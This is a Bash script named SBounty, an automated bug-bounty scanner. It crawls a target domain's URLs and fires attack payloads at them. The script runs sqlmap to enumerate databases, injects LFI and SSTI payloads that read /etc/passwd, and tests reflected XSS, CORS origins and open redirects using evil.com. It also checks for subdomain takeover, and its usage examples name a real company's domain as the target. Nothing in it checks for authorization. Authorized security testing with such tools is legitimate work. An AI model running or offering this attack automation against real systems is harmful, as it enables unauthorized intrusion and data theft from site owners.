#!/bin/bash

. config.ini

# TERM COLORS
bred='\033[1;31m'
bblue='\033[1;34m'
bgreen='\033[1;32m'
byellow='\033[1;33m'
bcyan='\033[1;36m'
red='\033[0;31m'
blue='\033[0;34m'
green='\033[0;32m'
yellow='\033[0;33m'
reset='\033[0m'

function banner(){
printf "\n${bcyan}"
printf " ____  ____                    _             \n"
printf "/ ___|| __ )  ___  _   _ _ __ | |_ _   _     \n"
printf "\___ \|  _ \ / _ \| | | | '_ \| __| | | |    \n" 
printf " ___) | |_) | (_) | |_| | | | | |_| |_| |    \n"
printf "|____/|____/ \___/ \__,_|_| |_|\__|\__, |    \n"
printf "                                   |___/     \n"
printf "                                by Shockz${reset}\n"
}

function help(){
    printf "#################################\n"
	printf "Usage: $0 [-f urls_file] [-s subdomain] [-t] \n"
    printf "**THIS ONLY WORKS With No-Authenticated websites**\n"
    printf " \n"
    printf " ${bblue}TARGET OPTIONS${reset}\n"
	printf "   -s subdomain      Live Target subdomain\n"
    printf "   -f file           Urls file (Local Target)\n"
    printf " \n"
    printf " ${bblue}MODE OPTIONS${reset}\n"
    printf "   -t                Live Subdomain Takeover - Perform a subdomain takeover check\n"
    printf "   -h                Help - Show this help\n"
    printf " \n"
	printf " ${bblue}USAGE EXAMPLES${reset}\n"
	printf " ./sbounty.sh -f urls.txt\n"
	printf " ./sbounty.sh -s tesla.com\n"
    printf " ./sbounty.sh -s www.tesla.com\n"
    printf " ./sbounty.sh -s https://www.tesla.com\n"
	printf " \n"
    printf " Subdomain Takeover check:\n"
    printf " ./sbounty.sh -s www.tesla.com -t \n"
    printf " \n"
    printf "#################################\n"
}

function out(){
    printf "\n"
    help
    exit
}

function install(){
    printf "\n\n${bgreen}#######################################################################${reset}\n"
    printf "${bblue} Checking and installing tools ${reset}\n\n"

    if ! dpkg -s sqlmap &> /dev/null; then
        sudo apt install sqlmap -y
    fi

    if ! [[ $(eval type go 2>/dev/null | grep -o 'go is') == "go is" ]]; then
        version=$(curl -L -s https://golang.org/VERSION?m=text)
        wget https://dl.google.com/go/${version}.linux-amd64.tar.gz > /dev/null 2>&1
        tar -C /usr/local -xzf ${version}.linux-amd64.tar.gz
        ln -sf /usr/local/go/bin/go /usr/local/bin/
        rm -rf $version*
        export GOROOT=/usr/local/go
        export GOPATH=$HOME/go
        export PATH=$GOPATH/bin:$GOROOT/bin:$HOME/.local/bin:$PATH
        profile_shell=".$(basename $(echo $SHELL))rc"
cat << EOF >> ~/"${profile_shell}"
# Golang vars
export GOROOT=/usr/local/go
export GOPATH=\$HOME/go
export PATH=\$GOPATH/bin:\$GOROOT/bin:\$HOME/.local/bin:\$PATH
EOF
        printf "${yellow} Golang installed ${reset}\n"
    fi

    if [ ! -d ~/.gf ];then
        git clone https://github.com/1ndianl33t/Gf-Patterns > /dev/null 2>&1
        mkdir ~/.gf
        mv ~/Gf-Patterns/*.json ~/.gf > /dev/null 2>&1
        printf "${yellow} GF-Patterns installed ${reset}\n"
    fi

    allinstalled=true
    
	which waybackurls &>/dev/null || allinstalled=false;
	which gf &>/dev/null || allinstalled=false;
	which qsreplace &>/dev/null || allinstalled=false;
	which rush &>/dev/null || allinstalled=false;
    which freq &>/dev/null || allinstalled=false;
    which subjack &>/dev/null || allinstalled=false;
    which httpx &>/dev/null || allinstalled=false;
    which gau &>/dev/null || allinstalled=false;
    which uro &>/dev/null || allinstalled=false;
    which hakrawler &>/dev/null || allinstalled=false;
    
    if [ "${allinstalled}" = true ]; then
		printf "${bgreen} Good! All installed! ${reset}\n\n"
	else
        go env -w GO111MODULE=auto
        go_step=0
		declare -A gotools
        gotools["gf"]="go install -v github.com/tomnomnom/gf@latest"
        gotools["qsreplace"]="go install -v github.com/tomnomnom/qsreplace@latest"
        gotools["waybackurls"]="go install -v github.com/tomnomnom/waybackurls@latest"
        gotools["httpx"]="go install -v github.com/projectdiscovery/httpx/cmd/httpx@latest"
        gotools["gau"]="go install github.com/lc/gau/v2/cmd/gau@latest"
        gotools["rush"]="go install github.com/shenwei356/rush@latest"
        gotools["freq"]="go install github.com/takshal/freq@latest"
        gotools["hakrawler"]="go install github.com/hakluke/hakrawler@latest"

        for gotool in "${!gotools[@]}"; do
            go_step=$((go_step + 1))
            eval ${gotools[$gotool]} &>/dev/null
            if [ $? -eq 0 ]; then
                printf "${yellow} $gotool installed ${reset}\n"
            else
                printf "${red} Unable to install $gotool, try manually ${reset}\n"
            fi
        done

        sudo apt install subjack -y > /dev/null 2>&1
        printf "${yellow} Subjack installed ${reset}\n"

        pip3 install uro > /dev/null 2>&1
        printf "${yellow} Uro installed ${reset}\n"
	fi
}

## Reflected XSS
function reflected_xss(){
    printf "\n${bblue}[**]${reset} Reflected XSS ${bblue}[**]${reset}\n"
    output="$results_path/xss.txt"
    > "$output"
    found=false
    while read -r parameter; do
        gf xss < "$urls_output_path" | qsreplace "$parameter" 2> /dev/null | freq | tee -a "$output" | grep "31m" 
        if grep -q "31m" "$output"; then
            found=true
            break
        fi
    done < xss_payloads.txt
    if ! $found;then
        printf "\n${byellow}[!]${reset} Sorry, Nothing found :(\n"
    fi
}

## SQLI
function sqli(){
    output_urls="$results_path/sqli_urls.txt"
    output="$results_path/sqli.txt"
    > "$output_urls"
    > "$output"
    printf "\n${bblue}[**]${reset} SQL Injection ${bblue}[**]${reset}\n"
    gf sqli < "$urls_output_path" >> "$output_urls"
    sqlmap -m "$output_urls" --batch -v 0 --flush-session --random-agent --level 1 --dbs --tamper=space2comment --headers="$headers" --random-agent | tee -a "$output"
    if ! grep -q "available databases" "$output" ;then
        printf "\n${byellow}[!]${reset} Sorry, Nothing found :(\n"
    fi
}

## CORS
function cors(){
    output="$results_path/cors.txt"
    > "$output"
    payloads=("!" "(" ")" "'" ";" "=" "^" "{" "}" "|" "~" '"' '`' "," "%60" "%0b")
    found=false
    printf "\n${bblue}[**]${reset} CORS ${bblue}[**]${reset}\n"
    while read url; do 
        for payload in "${payloads[@]}"; do 
            response=$(curl -s -I -H "Origin: ${url}${payload}.evil.com" -X GET "$url")
            if echo "$response" | grep -F -q "${url}${payload}.evil.com"; then 
                printf "${bred}[Potential CORS Found] $url ${reset}\n" | tee -a "$output"
                found=true
            fi
        done
    done < "$urls_output_path"
    if ! $found;then
        printf "\n${byellow}[!]${reset} Sorry, Nothing found :(\n"
    fi
}

## LFI
function lfi(){
    output="$results_path/lfi.txt"
    output_urls="$results_path/lfi_urls.txt"
    > "$output"
    found=false
    printf "\n${bblue}[**]${reset} LFI ${bblue}[**]${reset}\n"
    gf lfi < "$urls_output_path" | qsreplace "../../../../../../../../etc/passwd" >> "$output_urls"
    while read url; do 
        if curl --header "$headers" -s "$url" 2>&1 | grep -q "root:x"; then 
            printf "${bred}VULN! $url${reset}\n" >> "$output"
            found=true
        fi
    done < "$output_urls"
    if ! $found;then
        printf "\n${byellow}[!]${reset} Sorry, Nothing found :(\n"
    fi
}

## SSTI
function ssti(){
    output="$results_path/ssti.txt"
    output_urls="$results_path/ssti_urls.txt"
    > "$output"
    found=false
    printf "\n${bblue}[**]${reset} SSTI ${bblue}[**]${reset}\n"
    URL=$(echo "$1" | httpx -silent)
    if curl -s -X GET "$URL/%7B%7B9955%2A9955%7D%7D" 2>&1 | grep -q "99102025"; then
        printf "${bred}VULNERABLE: $URL/{{9955*9955}}\n${reset}"
        found=true
    fi
    gf ssti < "$urls_output_path" | qsreplace "{{''.class.mro[2].subclasses()[40]('/etc/passwd').read()}}" >> "$output_urls"
    while read url; do 
        if curl --header "$headers" -s "$url" 2>&1 | grep -q "root:x"; then 
            printf "${bred}VULN! $url${reset}\n" >> "$output"
            found=true
        fi
    done < "$output_urls"
    if ! $found;then
        printf "\n${byellow}[!]${reset} Sorry, Nothing found :(\n"
    fi
}

## Subdomain Takeover
function subdomain_takeover(){
    output="$results_path/takeover.txt"
    > "$output"
    found=false
    printf "\n${bblue}[**]${reset} Subdomain Takeover ${bblue}[**]${reset}\n"
    if subjack -d "$1" -a -ssl -t 100 | tee -a "$output" | grep -q "Vulnerable"; then
        found=true
    fi
    if ! $found;then
        printf "\n${byellow}[!]${reset} Sorry, Nothing found :(\n"
    fi
}

## Open redirect
function open_redirect(){
    output="$results_path/open_redirect.txt"
    > "$output"
    found=false
    printf "\n${bblue}[**]${reset} Open Redirect ${bblue}[**]${reset}\n"
    if gf redirect < "$urls_output_path" | cut -f 3- -d ':' | qsreplace "https://evil.com" | httpx -H "$headers" -silent -status-code -location | grep -q "Location: https://evil.com"; then
        echo "${bred}VULN!${reset}" >> "$output"
        found=true
    fi
    if ! $found;then
        printf "\n${byellow}[!]${reset} Sorry, Nothing found :(\n"
    fi
}

###### SCRIPT STARTS HERE ######
subdomain_takeover=false
urls_file=""
headers=""

PROGARGS=$(getopt -o "s:f:H:th" -- "$@")
if [ $? -ne 0 ]; then out; fi
eval set -- "$PROGARGS"
unset PROGARGS

while true; do
    case "$1" in
        '-f') urls_file=$2; shift 2; continue ;;
        '-s') subdomain=$2; shift 2; continue ;;
        '-H') headers=$2; shift 2; continue ;;
        '-t') subdomain_takeover=true; shift; continue ;;
        '--') shift; break ;;
        '-h') out ;;
        *) echo "Argumento no reconocido: $1"; out ;;
    esac
done

dominio_temp=$(echo "$subdomain" | sed -E 's/https?:\/\/(www\.)?([a-zA-Z0-9.-]+)(\/.*)?/\2/')
dominio=$(echo "$dominio_temp" | tr -d -c '[:alnum:]')
results_path="results/$dominio"

# inicialización segura de urls_output_path
if [ "$subdomain_takeover" = true ]; then
    if [ -n "$subdomain" ] && [ -n "$urls_file" ]; then
        echo "ERROR: No puedes usar -t y -f al mismo tiempo."
        out
    fi
elif [ -n "$subdomain" ] && [ -n "$urls_file" ]; then
    echo "ERROR: No puedes usar -s y -f al mismo tiempo."
    out
fi

if [ -n "$subdomain" ]; then
    urls_output_path="$results_path/urls.txt"
elif [ -n "$urls_file" ]; then
    urls_output_path="$urls_file"
else
    echo "ERROR: Debes usar -s o -f."
    out
fi

if [[ $(id -u | grep -o '^0$') != "0" ]]; then
    printf "${bred} Please run as root or with user added to sudoers ${reset}\n\n"
    exit
fi

banner
install

if [ ! -d "$results_path" ]; then mkdir -p "$results_path"; fi
printf "${bgreen}[*]${reset} Here we go buddy!!\n"


if [ -n "$subdomain" ]; then
    urls_output_path="$results_path/urls.txt"

    if [ -f "$urls_output_path" ]; then
        printf "${byellow}[*]${reset} URLs file already exists, skipping crawling.\n"
    else
    {
        gau "$subdomain" --threads 10 2>/dev/null
        waybackurls "$subdomain" 2>/dev/null
        katana -u "$subdomain" -silent -jc -d 3 2>/dev/null
        echo "$subdomain" | hakrawler -d 3 -insecure 2>/dev/null
    } | uro | sort -u \
      | grep -E "^https?://([a-z0-9.-]*\.)?$subdomain" \
      > "$urls_output_path"

    # Añadir URLs vía APIs
    api_urls() {
        echo "[*] Fetching URLs via APIs..."
        {
            # OTX API
            if [ -n "$otx_api_key" ]; then
                curl -s -H "X-OTX-API-KEY: $otx_api_key" \
                    "https://otx.alienvault.com/api/v1/indicators/domain/$subdomain/url_list?limit=100&page=1" \
                | jq -r '.url_list[].url' 2>/dev/null
            fi

            # URLSCAN API
            if [ -n "$urlscan_api_key" ]; then
                curl -s -H "API-Key: $urlscan_api_key" \
                    "https://urlscan.io/api/v1/search/?q=domain:$subdomain" \
                | jq -r '.results[].page.url' 2>/dev/null
            fi
        } | uro | sort -u \
          | grep -E "^https?://([a-z0-9.-]*\.)?$subdomain" \
          >> "$urls_output_path"
    }

    api_urls
    fi
else
    urls_output_path="$urls_file"
fi

test "$xss" = "true" && reflected_xss
test "$sqli" = "true" && sqli
test "$cors" = "true" && cors
test "$ssrf" = "true" && ssrf
test "$lfi" = "true" && lfi
test "$ssti" = "true" && ssti "$subdomain"
test "$open_redirect" = "true" && open_redirect 
test "$subdomain_takeover" = "true" && subdomain_takeover "$subdomain"